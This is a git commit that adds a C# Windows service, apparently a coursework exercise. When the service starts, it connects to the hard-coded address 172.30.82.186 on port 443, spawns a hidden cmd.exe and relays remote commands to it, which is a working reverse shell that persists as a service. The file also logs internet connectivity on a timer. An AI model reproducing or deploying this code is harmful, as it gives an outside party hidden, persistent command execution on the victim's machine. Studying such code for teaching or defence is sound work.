ceeb334e9c22e2aa98877488fec59173857642b2
root <root@LeDungPC.localdomain>
2021-03-28 14:05:16 +0700

    Init Commit

---
+++ ServiceBai3/MainService.cs
@@ -0,0 +1,140 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.ServiceProcess;
+using System.Text;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Timers;
+using System.Windows.Forms;
+
+namespace ServiceBai3
+{
+    public partial class MainService : ServiceBase
+    {
+        System.Timers.Timer timer = new System.Timers.Timer();
+        static StreamWriter streamWriter;
+        public MainService()
+        {
+            InitializeComponent();
+        }
+        protected override void OnStart(string[] args)
+        {            
+            WriteToFile("Create a reverse shell server after 5s, please wait....");
+            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
+            timer.Interval = 5000;
+            timer.Enabled = true;
+            ReverseShell();
+        }
+
+        private static void ReverseShell()
+        {
+            using (TcpClient client = new TcpClient("172.30.82.186", 443))
+            {
+                using (Stream stream = client.GetStream())
+                {
+                    using (StreamReader rdr = new StreamReader(stream))
+                    {
+                        streamWriter = new StreamWriter(stream);
+
+                        StringBuilder strInput = new StringBuilder();
+
+                        Process p = new Process();
+                        p.StartInfo.FileName = "cmd.exe";
+                        p.StartInfo.CreateNoWindow = true;
+                        p.StartInfo.UseShellExecute = false;
+                        p.StartInfo.RedirectStandardOutput = true;
+                        p.StartInfo.RedirectStandardInput = true;
+                        p.StartInfo.RedirectStandardError = true;
+                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
+                        p.Start();
+                        p.BeginOutputReadLine();
+
+                        while (true)
+                        {
+                            strInput.Append(rdr.ReadLine());
+                            p.StandardInput.WriteLine(strInput);
+                            strInput.Remove(0, strInput.Length);
+                        }
+                    }
+                }
+            }
+        }
+
+        private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
+        {
+            StringBuilder strOutput = new StringBuilder();
+
+            if (!String.IsNullOrEmpty(outLine.Data))
+            {
+                try
+                {
+                    strOutput.Append(outLine.Data);
+                    streamWriter.WriteLine(strOutput);
+                    streamWriter.Flush();
+                }
+                catch (Exception ex) {
+                    WriteToFile(ex.Message.ToString());
+                    using (ServiceController serviceController = new ServiceController("Service"))
+                    {
+                        serviceController.Stop();
+                    }
+                }
+            }
+        }
+
+        protected override void OnStop()
+        {
+            WriteToFile("Service is stopped at " + DateTime.Now);
+        }
+
+        private void OnElapsedTime(object source, ElapsedEventArgs e)
+        {
+            WriteToFile("Internet status:" + (CheckForInternetConnection() ? "có kết nối internet" : "không có kết nối internet"));
+        }
+
+        public static void WriteToFile(string Message)
+        {
+            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
+            if (!Directory.Exists(path))
+            {
+                Directory.CreateDirectory(path);
+            }
+            string filepath = AppDomain.CurrentDomain.BaseDirectory + "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') + ".txt";
+            if (!File.Exists(filepath))
+            {
+                using (StreamWriter sw = File.CreateText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+            else
+            {
+                using (StreamWriter sw = File.AppendText(filepath))
+                {
+                    sw.WriteLine(Message);
+                }
+            }
+        }
+
+        public static bool CheckForInternetConnection()
+        {
+            try
+            {
+                using (var client = new WebClient())
+                using (client.OpenRead("http://google.com/generate_204"))
+                    return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+    }
+}
